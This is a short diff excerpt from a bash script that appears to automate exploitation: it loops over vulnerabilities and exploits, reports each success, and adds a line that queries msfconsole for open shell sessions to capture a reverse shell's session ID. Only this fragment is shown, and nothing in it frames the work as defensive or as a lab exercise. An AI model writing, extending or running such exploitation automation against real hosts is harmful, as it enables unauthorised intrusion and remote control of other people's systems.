@@ -166,6 +166,7 @@ while read vuln; do
                         echo "Exploited vulnerability $vuln using exploit $exploit"
                         exploitsFound=1
                         exploit_executed=true
+                        session_id=$(msfconsole -x "sessions -l | grep '.*shell.*'" | awk '{print $1}') # get session ID of reverse shell
                         break 2 # break out of both loops when an exploit is successfully executed
                     else
                         echo "Failed to exploit vulnerability $vuln using exploit $exploit"
